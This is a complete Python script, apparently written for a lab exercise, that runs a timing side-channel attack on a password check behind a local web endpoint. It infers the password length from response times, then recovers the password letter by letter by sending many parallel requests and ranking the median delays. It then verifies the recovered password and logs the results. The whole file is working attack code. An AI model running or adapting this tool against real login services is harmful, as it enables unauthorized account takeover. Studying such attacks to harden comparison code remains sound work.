#!/usr/bin/env python3
"""
Interactive Timing Side-Channel Attack (enhanced, verbose timestamps)

Adds:
- Timestamps at run start/end, phase start/end, and per-position start/end
- Detailed per-position reports:
  * quick-stage top-K candidates (char, median, samples)
  * full-stage re-measured candidates (char, median, samples) and chosen char
  * elapsed times: since run start and since position start
- Final delta time for whole run
- Saves JSON + TXT summary (same as before)
"""

import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from statistics import median
from typing import Tuple, List, Dict, Optional
from datetime import datetime
import json
import os

# Configuration defaults
BASE_URL = "http://127.0.0.1"
CHARSET = "abcdefghijklmnopqrstuvwxyz"
MAX_LENGTH = 32

# --- Timing helpers ---------------------------------------------------------
def perf_time() -> float:
    return time.perf_counter()

def fmt_time(t: float) -> str:
    return f"{t:.12f}s"

def now_iso() -> str:
    return datetime.now().isoformat(sep=" ", timespec="seconds")

# --- Network measurement ---------------------------------------------------
def measure_time(username: str, password: str, difficulty: int, timeout: float = 10.0) -> float:
    url = f"{BASE_URL}/?user={username}&password={password}&difficulty={difficulty}"
    start = perf_time()
    try:
        requests.get(url, timeout=timeout)
        return perf_time() - start
    except Exception:
        return 0.0

def parallel_measurements(username: str, password: str, difficulty: int,
                          measurements: int, workers: int) -> List[float]:
    times: List[float] = []
    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(measure_time, username, password, difficulty) for _ in range(measurements)]
        for future in as_completed(futures):
            t = future.result()
            if t > 0:
                times.append(t)
    return times

def median_time_from_list(times: List[float]) -> float:
    return median(times) if times else 0.0

# --- Ranking-enabled character crack ---------------------------------------
def crack_character_with_ranking(username: str, known_password: str, password_length: int,
                                 difficulty: int,
                                 quick_measurements: int, quick_workers: int,
                                 full_measurements: int, full_workers: int,
                                 top_k: int) -> Tuple[str, float, Dict]:
    position = len(known_password)
    padding_length = password_length - position - 1
    padding = "a" * padding_length
    debug = {"quick": [], "full": []}

    # Stage 1: quick probe for all chars
    for ch in CHARSET:
        test_pwd = known_password + ch + padding
        times = parallel_measurements(username, test_pwd, difficulty, quick_measurements, quick_workers)
        med = median_time_from_list(times)
        debug["quick"].append({"char": ch, "pwd": test_pwd, "median": med, "samples": len(times)})

    # sort quick stage descending by median and pick top_k
    debug["quick"].sort(key=lambda x: x["median"], reverse=True)
    top_candidates = debug["quick"][:top_k]

    # Stage 2: full measurements for top candidates
    for cand in top_candidates:
        ch = cand["char"]
        test_pwd = cand["pwd"]
        times = parallel_measurements(username, test_pwd, difficulty, full_measurements, full_workers)
        med = median_time_from_list(times)
        debug["full"].append({"char": ch, "pwd": test_pwd, "median": med, "samples": len(times)})

    debug["full"].sort(key=lambda x: x["median"], reverse=True)
    best = debug["full"][0]
    return best["char"], best["median"], debug

# --- Non-ranking simple character crack -----------------------------------
def crack_character_simple(username: str, known_password: str, password_length: int,
                           difficulty: int, measurements: int, workers: int) -> Tuple[str, float, Dict]:
    position = len(known_password)
    padding_length = password_length - position - 1
    padding = "a" * padding_length
    results = []
    for ch in CHARSET:
        test_pwd = known_password + ch + padding
        times = parallel_measurements(username, test_pwd, difficulty, measurements, workers)
        med = median_time_from_list(times)
        results.append({"char": ch, "pwd": test_pwd, "median": med, "samples": len(times)})
    results.sort(key=lambda x: x["median"], reverse=True)
    best = results[0]
    debug = {"results": results}
    return best["char"], best["median"], debug

# --- Phase 1: find length --------------------------------------------------
def find_password_length(username: str, difficulty: int, measurements: int, workers: int) -> Tuple[int, Dict]:
    start_iso = now_iso()
    start_perf = perf_time()
    print(f"\n[PHASE 1 START] Finding password length at {start_iso}")
    length_times = []
    for length in range(1, MAX_LENGTH + 1):
        test_pwd = "a" * length
        times = parallel_measurements(username, test_pwd, difficulty, measurements, workers)
        med = median_time_from_list(times)
        length_times.append({"length": length, "median": med, "samples": len(times)})
        print(f"[{now_iso()}] Length {length:2d} -> median {fmt_time(med)} (samples={len(times)})")

    best = max(length_times, key=lambda x: x["median"])
    end_perf = perf_time()
    print(f"[PHASE 1 END] Completed at {now_iso()}  duration {fmt_time(end_perf - start_perf)}")
    return best["length"], {"length_times": length_times, "picked": best, "phase_start": start_iso, "phase_end": now_iso(), "phase_duration": end_perf - start_perf}

# --- Phase 2: crack password ------------------------------------------------
def crack_password(username: str, difficulty: int, length: int,
                   use_ranking: bool,
                   quick_measurements: int, quick_workers: int,
                   full_measurements: int, full_workers: int,
                   top_k: int,
                   simple_measurements: int, simple_workers: int) -> Tuple[str, List[Dict]]:
    discovered = ""
    per_char_log = []
    run_start_perf = perf_time()
    run_start_iso = now_iso()
    print(f"\n[PHASE 2 START] Cracking password of length {length} at {run_start_iso} (use_ranking={use_ranking})")

    for pos in range(length):
        pos_start_perf = perf_time()
        pos_start_iso = now_iso()
        print("\n" + "-" * 70)
        print(f"[{pos+1}/{length}] Position start at {pos_start_iso}  Known so far: '{discovered}'")
        # If ranking: quick stage -> show top_k -> full stage -> show full results
        if use_ranking:
            # Quick stage (we do the quick probes inside the ranking function, but we want to print the quick top_k)
            # We will call the ranking function but first run a quick-only pass to get quick results for printing
            # Quick-only pass
            quick_debug = {"quick": []}
            padding_length = length - len(discovered) - 1
            padding = "a" * padding_length
            for ch in CHARSET:
                test_pwd = discovered + ch + padding
                q_times = parallel_measurements(username, test_pwd, difficulty, quick_measurements, quick_workers)
                q_med = median_time_from_list(q_times)
                quick_debug["quick"].append({"char": ch, "pwd": test_pwd, "median": q_med, "samples": len(q_times)})
            quick_debug["quick"].sort(key=lambda x: x["median"], reverse=True)
            top_candidates = quick_debug["quick"][:top_k]

            print(f"\n[{now_iso()}] Quick-stage (top {top_k}) candidates:")
            for i, c in enumerate(top_candidates, start=1):
                print(f"  {i}. '{c['char']}'  pwd='{c['pwd']}'  median={fmt_time(c['median'])}  samples={c['samples']}")

            # Now run the full ranking function (which re-measures top candidates)
            chosen_char, chosen_med, debug = crack_character_with_ranking(
                username, discovered, length, difficulty,
                quick_measurements, quick_workers,
                full_measurements, full_workers,
                top_k
            )

            print(f"\n[{now_iso()}] Full-stage re-measure results (top candidates):")
            for i, c in enumerate(debug["full"], start=1):
                marker = " <-- SELECTED" if c["char"] == chosen_char else ""
                print(f"  {i}. '{c['char']}'  pwd='{c['pwd']}'  median={fmt_time(c['median'])}  samples={c['samples']}{marker}")

            selected_char = chosen_char
            selected_median = chosen_med
            method = "ranking"

            # For richer logging, also show the quick-stage times (which moved forward)
            moved_chars = [{"char": c["char"], "quick_median": c["median"], "quick_samples": c["samples"]} for c in top_candidates]

        else:
            # Simple mode: measure all chars fully and print top few
            results = []
            padding_length = length - len(discovered) - 1
            padding = "a" * padding_length
            for ch in CHARSET:
                test_pwd = discovered + ch + padding
                times = parallel_measurements(username, test_pwd, difficulty, simple_measurements, simple_workers)
                med = median_time_from_list(times)
                results.append({"char": ch, "pwd": test_pwd, "median": med, "samples": len(times)})
            results.sort(key=lambda x: x["median"], reverse=True)

            print(f"\n[{now_iso()}] Simple-mode top 5 candidates:")
            for i, c in enumerate(results[:5], start=1):
                print(f"  {i}. '{c['char']}'  pwd='{c['pwd']}'  median={fmt_time(c['median'])}  samples={c['samples']}")

            selected_char = results[0]["char"]
            selected_median = results[0]["median"]
            method = "simple"
            moved_chars = [{"char": r["char"], "median": r["median"], "samples": r["samples"]} for r in results[:top_k]]

        # finalize this position
        discovered += selected_char
        pos_end_perf = perf_time()
        pos_elapsed = pos_end_perf - pos_start_perf
        run_elapsed = pos_end_perf - run_start_perf

        print(f"\n[{now_iso()}] Selected '{selected_char}'  median={fmt_time(selected_median)}  (method={method})")
        print(f"Position finished at {now_iso()}")
        print(f"Elapsed for this position: {fmt_time(pos_elapsed)}")
        print(f"Elapsed since phase start: {fmt_time(run_elapsed)}")

        # additionally print which letters moved forward each time (with quick times if ranking)
        if use_ranking:
            print("\nLetters that moved to full-stage (with quick-stage medians):")
            for idx, mc in enumerate(moved_chars, start=1):
                print(f"  {idx}. '{mc['char']}' quick_median={fmt_time(mc['quick_median'])} samples={mc['quick_samples']}")
        else:
            print("\nTop candidates summary (simple mode):")
            for idx, mc in enumerate(moved_chars, start=1):
                print(f"  {idx}. '{mc['char']}' median={fmt_time(mc['median'])} samples={mc['samples']}")

        # record per-character log
        per_char_log.append({
            "position": pos,
            "char": selected_char,
            "selected_median": selected_median,
            "method": method,
            "moved_chars": moved_chars,
            "timestamp_end": now_iso(),
            "elapsed_for_position_seconds": pos_elapsed,
            "elapsed_since_phase_start_seconds": run_elapsed
        })

    total_end_perf = perf_time()
    total_elapsed = total_end_perf - run_start_perf
    print(f"\n[PHASE 2 END] Completed at {now_iso()}  total phase duration: {fmt_time(total_elapsed)}")
    return discovered, per_char_log

# --- Verification ----------------------------------------------------------
def verify_password(username: str, password: str, difficulty: int) -> bool:
    url = f"{BASE_URL}/?user={username}&password={password}&difficulty={difficulty}"
    try:
        r = requests.get(url, timeout=10)
        return "1" in r.text
    except Exception:
        return False

# --- Save summary ----------------------------------------------------------
def save_run_summary(output_dir: str,
                     config: Dict,
                     password_length: Optional[int],
                     discovered_password: Optional[str],
                     per_char_log: Optional[List[Dict]],
                     start_iso: str,
                     end_iso: str,
                     total_elapsed: float) -> str:
    os.makedirs(output_dir, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    json_fname = os.path.join(output_dir, f"run_summary_{ts}.json")
    txt_fname = os.path.join(output_dir, f"run_summary_{ts}.txt")

    summary = {
        "config": config,
        "password_length": password_length,
        "discovered_password": discovered_password,
        "start": start_iso,
        "end": end_iso,
        "total_elapsed_seconds": total_elapsed,
        "per_char_count": len(per_char_log) if per_char_log else 0,
    }

    try:
        with open(json_fname, "w") as jf:
            json.dump({"summary": summary, "per_char_log": per_char_log}, jf, indent=2)
        with open(txt_fname, "w") as tf:
            tf.write("=" * 60 + "\n")
            tf.write("TIMING SIDE-CHANNEL RUN SUMMARY\n")
            tf.write("=" * 60 + "\n")
            tf.write(f"Start: {start_iso}\n")
            tf.write(f"End:   {end_iso}\n")
            tf.write(f"Duration: {fmt_time(total_elapsed)}\n\n")
            tf.write("CONFIG:\n")
            for k, v in config.items():
                tf.write(f"  - {k}: {v}\n")
            tf.write("\nRESULT:\n")
            tf.write(f"  - Password length: {password_length}\n")
            tf.write(f"  - Discovered password: {discovered_password}\n")
            tf.write(f"  - Per-character results: {len(per_char_log) if per_char_log else 0}\n")
            tf.write("\nPer-character details (short):\n")
            if per_char_log:
                for entry in per_char_log:
                    tf.write(f"  - pos {entry['position']}: '{entry['char']}'  median={fmt_time(entry['selected_median'])}  elapsed_pos={fmt_time(entry['elapsed_for_position_seconds'])}\n")
            tf.write("\n(For full details see JSON file.)\n")
        print(f"\n✓ Summary saved to:\n  - {txt_fname}\n  - {json_fname}")
        return txt_fname
    except Exception as e:
        print(f"✗ Error saving summary: {e}")
        return ""

# --- Interactive menu / config ---------------------------------------------
def get_int_input(prompt: str, default: int, min_val: int = 1, max_val: int = 100) -> int:
    while True:
        try:
            raw = input(f"{prompt} [{default}]: ").strip()
            if raw == "":
                return default
            v = int(raw)
            if v < min_val or v > max_val:
                print(f"Please enter between {min_val} and {max_val}")
                continue
            return v
        except ValueError:
            print("Please enter a valid integer")

def interactive_menu():
    cfg = {
        "username": "",
        "difficulty": 1,
        "measurements": 8,
        "workers": 8,
        # ranking defaults
        "use_ranking": True,
        "quick_measurements": 2,
        "quick_workers": 6,
        "full_measurements": 6,
        "full_workers": 8,
        "top_k": 3,
        # simple mode fallback
        "simple_measurements": 8,
        "simple_workers": 8,
        "output_dir": "attack_runs"
    }

    print("\n" + "=" * 70)
    print("    INTERACTIVE TIMING SIDE-CHANNEL (verbose timestamps)")
    print("=" * 70)

    while True:
        uname = input("Enter your username/ID: ").strip()
        if uname:
            cfg["username"] = uname
            break
        print("Username cannot be empty.")

    cfg["difficulty"] = get_int_input("Difficulty (1-10)", default=cfg["difficulty"], min_val=1, max_val=10)
    cfg["measurements"] = get_int_input("Measurements per probe (default for length finding)", default=cfg["measurements"], min_val=1, max_val=200)
    cfg["workers"] = get_int_input("Parallel workers (default for length finding)", default=cfg["workers"], min_val=1, max_val=200)

    use_rank_raw = input(f"Use ranking two-stage mode? (y/n) [{'y' if cfg['use_ranking'] else 'n'}]: ").strip().lower()
    cfg["use_ranking"] = (use_rank_raw != "n")

    if cfg["use_ranking"]:
        cfg["quick_measurements"] = get_int_input("Quick measurements per candidate (stage 1)", default=cfg["quick_measurements"], min_val=1, max_val=10)
        cfg["quick_workers"] = get_int_input("Workers for quick stage", default=cfg["quick_workers"], min_val=1, max_val=200)
        cfg["full_measurements"] = get_int_input("Full measurements per candidate (stage 2)", default=cfg["full_measurements"], min_val=1, max_val=200)
        cfg["full_workers"] = get_int_input("Workers for full stage", default=cfg["full_workers"], min_val=1, max_val=200)
        cfg["top_k"] = get_int_input("Top-K candidates to keep after quick stage", default=cfg["top_k"], min_val=1, max_val=len(CHARSET))
    else:
        cfg["simple_measurements"] = get_int_input("Measurements per char (simple mode)", default=cfg["simple_measurements"], min_val=1, max_val=200)
        cfg["simple_workers"] = get_int_input("Workers for simple mode", default=cfg["simple_workers"], min_val=1, max_val=200)

    print("\nSummary of configuration:")
    for k, v in cfg.items():
        if k.startswith("quick_") or k.startswith("full_") or k.startswith("simple_") or k in ("use_ranking","top_k"):
            print(f"  - {k}: {v}")
    print("=" * 70)

    print("What would you like to do?")
    print("1. Find password length only (Phase 1)")
    print("2. Crack password (Phase 2) - requires known/assumed length")
    print("3. Full attack (Phase 1 + Phase 2)")
    choice = get_int_input("Enter choice (1-3)", default=3, min_val=1, max_val=3)

    run_start_iso = now_iso()
    run_start_perf = perf_time()
    print(f"\n[RUN START] {run_start_iso}")

    password_length = None
    discovered_password = None
    per_char_log = None

    if choice == 1:
        print(f"\n=== PHASE 1 ===")
        password_length, length_debug = find_password_length(cfg["username"], cfg["difficulty"], cfg["measurements"], cfg["workers"])
        print(f"\nDetected length: {password_length}")
    elif choice == 2:
        length_val = get_int_input(f"Enter known password length (1-{MAX_LENGTH})", default=8, min_val=1, max_val=MAX_LENGTH)
        discovered_password, per_char_log = crack_password(
            cfg["username"], cfg["difficulty"], length_val,
            cfg["use_ranking"],
            cfg["quick_measurements"], cfg["quick_workers"],
            cfg["full_measurements"], cfg["full_workers"],
            cfg["top_k"],
            cfg["simple_measurements"], cfg["simple_workers"]
        )
    elif choice == 3:
        print(f"\n=== PHASE 1 ===")
        password_length, length_debug = find_password_length(cfg["username"], cfg["difficulty"], cfg["measurements"], cfg["workers"])
        print(f"\nDetected length: {password_length}")
        discovered_password, per_char_log = crack_password(
            cfg["username"], cfg["difficulty"], password_length,
            cfg["use_ranking"],
            cfg["quick_measurements"], cfg["quick_workers"],
            cfg["full_measurements"], cfg["full_workers"],
            cfg["top_k"],
            cfg["simple_measurements"], cfg["simple_workers"]
        )

    run_end_perf = perf_time()
    run_end_iso = now_iso()
    total_elapsed = run_end_perf - run_start_perf

    print("\n" + "=" * 70)
    print(f"[RUN END] {run_end_iso}  Total run duration: {fmt_time(total_elapsed)}")
    print("=" * 70)

    if discovered_password:
        print("\nVerification:")
        ok = verify_password(cfg["username"], discovered_password, cfg["difficulty"])
        if ok:
            print(f"✓ SUCCESS - password '{discovered_password}' verified")
        else:
            print(f"✗ Attempted password '{discovered_password}' did not verify")

        # Save summary
        config_for_save = {k: cfg[k] for k in cfg if not k.startswith("simple_") or cfg["use_ranking"] is False}
        save_run_summary(cfg["output_dir"], config_for_save, password_length, discovered_password, per_char_log, run_start_iso, run_end_iso, total_elapsed)
    elif password_length:
        print(f"\nPassword length found: {password_length} (no cracking run performed)")

def main():
    try:
        interactive_menu()
    except KeyboardInterrupt:
        print("\n\nInterrupted by user.")
    except Exception as e:
        print(f"\nError: {e}")

if __name__ == "__main__":
    main()
